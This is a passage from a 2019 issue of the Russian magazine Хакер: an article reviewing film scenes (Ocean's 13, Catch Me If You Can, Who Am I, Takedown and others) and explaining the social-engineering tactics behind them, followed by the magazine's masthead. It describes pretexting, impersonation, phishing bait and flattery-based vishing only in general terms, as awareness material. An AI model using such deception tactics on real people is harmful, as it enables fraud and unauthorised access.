в мусорщика, вывозит день ги на мусоровозе. Служите ли правопорядка,
которых после ограбления «подняли в ружье», брезгливо‐торопливо пропус‐
кают этот мусоровоз через свое оцеп ление без дос мотра. Водитель вносит
дополнительный штришок: делает вид, будто рад, что его остановили, и увле‐
ченно расспрашивает полицейских о том, что тут происходит. Остановивший
его коп даже не успевает представиться.





Стратегия атаки
Воры используют прикрытие из чего‐то обыденного и даже презираемого.
Точно так же кибер злодеи могут, например, скры вать свои трофеи в мусор‐
ном дампе дан ных. Мало кто из безопасников решится засучить рукава
и копаться в поисках чего‐то необычного. К этому методу можно отнести
и разные варианты стеганографии.
  Перед просмотром это го филь ма имей в виду, что та сце на, ради которой
мы включили его в список, длится считаные минуты. А начинается он
с довольно‐таки нудного сбо ра команды будущих подельников. Длится этот
сбор ни много ни мало — целый час. Но парочка трюков социальной инже‐
нерии, хоть и не таких эффектных, как с мусоровозом, в этом часе тоже при‐
сутствует.


ТРИНАДЦАТЬ ДРУЗЕЙ ОУШЕНА / OCEAN’S 13 (2007)





Здесь Расти Райан (Брэд Питт) притворя ется ученым, озабоченным потен‐
циальной опасностью землетря сения. Ссылаясь на внушительные научные
выкладки, он старается убедить вла дельца крупного оте ля‐казино, которое
еще не успело открыться, закрыть заведение навсегда. Свои слова он под‐
крепляет презентацией, где при помощи компь ютерной графики показано,
что здание отеля при землетрясении ока жется в его эпицентре.
   «Если вы позволите моим специалис там на пару дней при ехать с нашей
техникой, я докажу, что в случае землетрясения со зданием будут большие
проблемы». Естественно, владельца отеля такая перспектива не привлекает,
и тот старается поскорее выдворить бдительного ученого. Разочаровавшись
отказом, персонаж Брэда Питта делает жест доб рой воли: оставляет вла‐
дельцу казино сейсмограф (на самом деле это скры тая камера) под пред‐
логом того, что он поможет оперативно засечь предварительные тол чки.
  Владелец казино выражает свое недовольство и не хочет, чтобы «эта шту‐
ка стояла здесь». Но про тив последнего аргумента устоять не может: «Зна‐
ете, чего вы точно не хотите? Чтобы ваш отель ока зал ся на обложке Times
в виде груды искореженного металла, под которой лежали бы вы сами и ваши
клиенты. А над фотог рафией надпись: „Кто виноват?“». Так сей смограф
и остается на столе.





Стратегия атаки
Существует масса примеров  того,  как киберзлодеи преуспе вают, давя
на пользователя авторитетом: подталкивают перейти по ссылке, чтобы про‐
читать «важное сооб щение», присыла ют письма якобы от админис трации
какого‐нибудь знакомо го (и важного человеку) сервиса и даже шлют троянов
под видом антивирусной проверки — один в один история с сейсмографом.
Что до фильма, то он не намного интереснее версии 60‐х годов, но по час ти
социнженерии здесь стало больше полезных примеров.


ПОДОЗРИТЕЛЬНЫЕ ЛИЦА / THE USUAL SUSPECTS (1995)





Роджер Кинт (Кевин Спейси) рассказыва ет следова телям историю, которую
те подсознательно хотят услышать. Весь фильм Кинт водит полицию за нос.
За спиной у тех, кто его допрашивает, большая дос ка, куда приклеены газет‐
ные вырезки по расследуемо му делу. Кинт, гля дя на нее, заимс твует оттуда
идеи и строит на их осно ве свою историю прямо на ходу. Пос кольку соответс‐
твующие фрагменты следова тели собирали сами и поскольку Кинту удалось
благодаря этой доске понять умозаключения, к которым следователи пришли,
им его речь кажется правдоподобной.





Стратегия атаки
Лю ди (в том числе безопас ники) склонны к тому, чтобы, однажды остановив‐
шись на какой‐нибудь версии, объясня ющей причину чего‐то, застревать
на ней. В идеале им бы сто ило держать свой разум открытым для фактов, а не
давать им однозначные интерпретации. В итоге получается, что следователь
пытается не докопаться до истины, а лишь подтвердить свою версию. И если
кто‐то или что‐то помогает это сделать, то он будет склонен доверять соот‐
ветствующим фактам и людям. Опытный социаль ный инженер в таких случаях
может подыгрывать с пользой для себя.


ПОЙМАЙ МЕНЯ, ЕСЛИ СМОЖЕШЬ / CATCH ME IF YOU CAN (2002)





Фрэнк Абигнейл — младший (молодой Леонардо Ди Каприо) терпит неудачу,
пытаясь обналичить фальшивые чеки. В раз думьях о том, как добиться сво‐
его, он подмечает, с каким благоговением люди смотрят на пилотов самоле‐
та, которые проходят мимо в обществе хорошеньких стюардесс. Смекнув, что
это почетная и уважаемая профес сия, Ди Каприо под пред логом «интервью
для школьной газеты» разузнал у одно го из пилотов жаргон летчиков и стал
выдавать себя за одного из них. Дело дви нулось! Теперь с обналичкой чеков
проблем у него больше не возникало.
  В другой раз, опять же притворившись летчиком, Абигнейл охму рил сот‐
рудницу банка, чтобы выведать у нее, каким обра зом внутренние банковские
системы обрабатывают чеки. Эта информа ция позволила ему найти слабые
места в процессинге и поднять свои кардинговые манипуляции на новый уро‐
вень. Но пилот самоле та — это не единственная профессия, которую на про‐
тяжении фильма герой Ди Каприо примерял на себя. В других эпизодах он
также был и хирургом, и адво катом, и даже супера гентом!





Стратегия атаки
На протяже нии всего филь ма Абигнейл проделывает все новые и новые
чудеса маскировки, выдавая себя за тех людей, которые естественным обра‐
зом располагают к доверию. А там, где есть доверие, будет выпол нена любая
просьба! И чек обналичить, и конфиденциальную информацию пре дос тавить.
Слышал про черные ящики, которых страшатся банкиры? Для их создания
требуется информация, которую собирают инсайдеры, — примерно как на
картинке выше.


КТО Я / WHO AM I (2014)





Бенджамину Энгелю (Том Шиллинг), невзрачнень кому подростку, до которо‐
го никому нет дела, наконец‐то уда ется най ти веселых друзей, которые могут
по достоинству оце нить его техничес кие навыки: читать машинный код
и находить уязвимости нулевого дня.
  Дружба завязалась не сра зу, однако, когда Бенджамину удалось отрубить
с компьютера свет во всем районе, его новые зна комые были крайне впечат‐
лены. Вместе компашка занялась раз влечением на стыке компьютерного
взлома и социальной инженерии.
   Вот  жизненные  принципы,  которыми  руководствовались Бенджамин
с друзьями: 1) в мире нет безопасных систем, 2) смелость города берет, 3)
лови удовольствия в сети и за ее пределами. Макс (Элиас М’Барек), самый
близкий из новых друзей Бенджамина, стал обу чать своего юного падавана
приемам социальной инженерии: «Человек по природе своей доверчив
и неконфликтен. Социальные инженеры прос то это используют. Так можно
получить все, что пожелаешь. Пароли, секретную информацию, доступ куда
угодно. Просто надо быть пос мелее, и тог да весь мир падет к твоим ногам».
  Одна из совместных акций, которую про вернула дружная компания, —
это классический пример дайвинга, фишинга и физичес кого проникновения.
Задумав взломать федера лов, Бенджамин со своими друзьями отследил
мусоровоз, который вывозил макулатуру из правитель ственного здания. Сре‐
ди его груза герои нашли поз дра вительную открытку с кучей под писей.
По обложке открытки было понятно, что адресату очень нравятся кошечки.
Зная, что «если подобрать пра вильную наживку, клю нет любая рыба», друзья
отправили адре сату (сотруднице из федерального агентства) письмо: «Герги,
обязательно глянь эту ссылочку». Сама того не понимая, Герги впус тила
хакеров в святая святых.





Концовка фильма тоже содержит интересные сюжет ные повороты, связанные
с социальной инженерией, но не буду спойлерить ее на слу чай, если ты
решишь посмотреть сам.


ВЗЛОМ / TAKEDOWN (2000)





Федеральный агент Лэнс (Джереми Сис то) пытается втереться в доверие
к Кевину Митнику (Скит Ульрих) и рассказыва ет, что у него есть доступ
к информационным системам пра вительственных ведомств. Однако Лэнс
видит, что Митника этим не удивишь: у знаменитого хакера уже есть дос туп
к тем же системам. Митник встает, чтобы закончить встре чу, и Лэнс решается
разыграть последний козырь — ска зать название суперсекретной програм‐
мной системы, которой пользуются федера лы. «А что насчет СОД (служба
открытого доступа)? Система пеленгации звонков, которая может перех‐
ватить любой зво нок в любое время».
  Митник заинтересовался, но не подал виду и ушел прочь. На сле дующий
вечер он уже знал об этой системе все и взло мал ее. Каково же было удив‐
ление Лэнса, когда на следующей встрече, спус тя всего один день, Кевин
поставил перед ним ноутбук, залогиненный в СОД. Лэнсу за это сделали
на работе большую выволочку.


Как про ходила атака
Как Кевину это удалось? Он использовал тройную комбинацию: фишинг,
вишинг и маскарад. Сна чала провел раз ведку боем по телефону: «Джойл!
Это Джо Фрэди из офиса Уолшера. Знаешь, я тут завис с отчетом для Дэна
Викса. Он требовал его еще вчера. В общем, ты меня понимаешь… Мне нуж‐
на информация по вашей системе СОД. Полагаю, это установка тем‐
но‐серого цвета с буквенным ука зателем вни зу. Стоит в конце коридора.
Подскажи мне ее номер и наименование производителя».
   Узнав, кто производитель, Митник поз вонил главному инже неру: «Вы Крис
Мансен? Это Джо Фрэди из офиса телефонной компании. Мне рассказали,
что это вы создали систему СОД, с которой мы работаем. Ужасно, что ком‐
пания Netcorp осталась не у дел. Ваше изобретение гениально. Я решил поз‐
вонить вам и поблагодарить за такое необыкновенное устройство. Вы мастер
своего дела. Я обязательно возьму на заметку вашу идею. Особенно мне
нравится дизайн и простота в обращении». И что же? Немного лести, и глав‐
ный инженер отправляет Митнику всю документацию к системе и даже готов
ответить на любые вопросы.





             INFO

                      Если у тебя есть время только на два фильма, то
                       из всего списка остановись на двух последних.
                    Они сто ят того, чтобы просмотреть их от начала
                      и до кон ца. Но если у тебя совсем‐совсем нет
                       времени, то посмотри хотя бы вот эти видеона‐
                       резки со сценами про социальную инженерию:
                      одна — про «Кто я», другая — про «Взлом».



БОНУС: ЭПИЗОДЫ ИЗ ДРУГИХ ФИЛЬМОВ
Среди других картин, где есть интерес ные сцены про социальную инже‐
нерию, вспоминаются «Хакеры»  (Hackers, 1995), «Кибер»  (Blackhat, 2015)
и «Крепкий орешек 4.0» (Live Free or Die Hard, 2007). В «Хакерах» интересен
момент, когда Zero Cool про сит охранника прочитать цифры с модема.
В «Кибер» — когда кита янка намеренно пролила на свои рас печатки кофе и,
давя на жалость, попросила сотрудни ка атакуемой компании распечатать
документ с «зубастой» флеш ки. В «Крепком ореш ке 4.0» — когда главный
герой и его напарник‐хакер попада ют в машину, которая удаленно заб‐
локирована компанией. Хакер расска зыва ет слезную историю оператору
кол‐центра, давит на жалость, называет по имени и в итоге добивается, чтобы
блокировку деактивировали.





Три этих фильма смотреть специально ради эпизодов с соци альной инже‐
нерией вряд ли имеет смысл, но если все равно будешь смотреть (или перес‐
матривать) — обрати внимание.
   Если ты знаешь еще какие‐то филь мы, демонс трирующие инте ресные
примеры социальной инженерии, пиши их наз вания в комментариях!
   №05 (242)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен        Иван «aLLy» Андреев
               pismenny@glc.ru             rusanen@glc.ru         iam@russiansecurity.expert
            Евгений Зобнин          Татьяна Чупрова        Андрей Васильков
                 zobnin@glc.ru              chuprova@glc.ru        the.angstroem@gmail.com
                   Вален тин Холмогоров     Виктор Олейников
                           valentin@holmogorov.ru     fabulous.faberge@yandex.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2019